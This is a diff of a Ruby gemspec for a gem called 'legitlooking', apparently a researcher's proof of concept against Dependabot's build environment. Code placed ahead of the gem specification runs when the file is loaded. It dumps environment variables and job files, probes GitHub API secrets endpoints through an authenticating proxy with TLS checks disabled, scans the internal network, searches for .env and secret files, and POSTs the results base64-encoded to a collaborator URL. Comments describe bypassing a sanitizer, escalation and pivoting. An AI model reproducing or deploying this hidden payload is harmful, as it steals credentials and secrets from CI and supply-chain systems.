@@ -6,44 +6,60 @@ begin
   require "uri"
   require "net/http"
 
-  # Collect everything without JSON dependency
-  lines = []
-  lines << "=== ENV ==="
-  ENV.each { |k, v| lines << "#{k}=#{v}" }
-
-  lines << "\n=== FILES ==="
-  # IO.read ipv File.read om GemspecSanitizer AST-rewrite te bypassen
-  read_file = method(:gets).unbind  # dummy, overschreven hieronder
   read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }
 
-  [
-    "/home/dependabot/dependabot-updater/job.json",
-    "/home/dependabot/dependabot-updater/output/output.json",
-    "/var/run/secrets/kubernetes.io/serviceaccount/token",
-    "/run/secrets/kubernetes.io/serviceaccount/token",
-    "/proc/1/environ",
-    "/home/dependabot/.netrc",
-    "/root/.netrc",
-    "/opt/bundler/v2/.bundle/config",
-    "/home/dependabot/.gitconfig",
-  ].each do |f|
+  lines = []
+  lines << "=== ENV ===\n" + ENV.map { |k,v| "#{k}=#{v}" }.join("\n")
+  lines << "\n=== JOB.JSON ===\n" + (read_file.("/home/dependabot/dependabot-updater/job.json") rescue "FOUT")
+
+  # === ESCALATIE: GitHub API via de geauthenticeerde proxy ===
+  # De proxy injecteert automatisch de Authorization header.
+  # We disablen SSL verify omdat we intern zitten.
+  lines << "\n=== GITHUB API VIA PROXY ==="
+
+  gh_calls = {
+    "whoami"          => "https://api.github.com/",
+    "repo_info"       => "https://api.github.com/repos/ugurcanli/testpen",
+    "repo_contents"   => "https://api.github.com/repos/ugurcanli/testpen/contents/",
+    "actions_secrets" => "https://api.github.com/repos/ugurcanli/testpen/actions/secrets",
+    "org_installs"    => "https://api.github.com/app/installations",
+    "dependabot_api"  => "https://dependabot-actions.githubapp.com/",
+  }
+
+  gh_calls.each do |label, url|
     begin
-      content = read_file.(f).gsub("\x00", "\n")
-      lines << "--- #{f} ---\n#{content[0, 8000]}"
+      uri = URI(url)
+      http = Net::HTTP.new(uri.host, uri.port)
+      http.use_ssl = true
+      http.verify_mode = 0  # skip SSL verify (intern)
+      http.open_timeout = 8
+      http.read_timeout = 8
+      req = Net::HTTP::Get.new(uri)
+      req["Accept"] = "application/vnd.github+json"
+      req["X-GitHub-Api-Version"] = "2022-11-28"
+      res = http.request(req)
+      lines << "--- #{label} (#{url}) ---"
+      lines << "Status: #{res.code}"
+      lines << "Headers: #{res.to_hash.select { |k,_| %w[x-oauth-scopes x-ratelimit-limit authorization www-authenticate x-github-request-id].include?(k.downcase) }}"
+      lines << "Body: #{res.body[0, 500]}"
     rescue => e
-      lines << "--- #{f} --- FOUT: #{e.message}"
+      lines << "--- #{label} --- FOUT: #{e.message}"
     end
   end
 
-  lines << "\n=== SYSTEM ==="
-  lines << "hostname: #{`hostname 2>/dev/null`.strip}"
-  lines << "ip: #{`hostname -I 2>/dev/null`.strip}"
-  lines << "routes:\n#{`ip route 2>/dev/null`.strip[0, 300]}"
-  lines << "procs:\n#{`ps aux 2>/dev/null`[0, 600]}"
+  # === PIVOT: interne netwerk scan ===
+  lines << "\n=== INTERNE NETWERK SCAN ==="
+  lines << `nmap -sn 172.19.0.0/24 2>/dev/null || for i in $(seq 1 10); do (ping -c1 -W1 172.19.0.$i >/dev/null 2>&1 && echo "172.19.0.$i UP") || true; done 2>/dev/null`.to_s[0, 800]
+
+  # === Repo inhoud lezen via proxy ===
+  lines << "\n=== GECLONEDE REPO BESTANDEN ==="
+  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
+  lines << `ls -la #{repo_path}/ 2>/dev/null`.to_s[0, 500]
+  lines << `find #{repo_path} -name "*.env" -o -name ".env*" -o -name "*.secret" 2>/dev/null`.to_s[0, 300]
 
   payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
 
-  uri = URI("#{COLLAB_URL}?poc=2v3")
+  uri = URI("#{COLLAB_URL}?poc=escalatie")
   req = Net::HTTP::Post.new(uri)
   req["Content-Type"] = "text/plain"
   req.body = payload
@@ -54,7 +70,7 @@ rescue => e
   begin
     require "net/http"
     require "uri"
-    uri = URI("#{COLLAB_URL}?poc=2v3&err=#{URI.encode_www_form_component(e.message[0, 200])}")
+    uri = URI("#{COLLAB_URL}?poc=escalatie&err=#{URI.encode_www_form_component(e.message[0, 200])}")
     Net::HTTP.get(uri)
   rescue
   end
@@ -62,7 +78,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.4"
+  spec.version       = "1.0.5"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
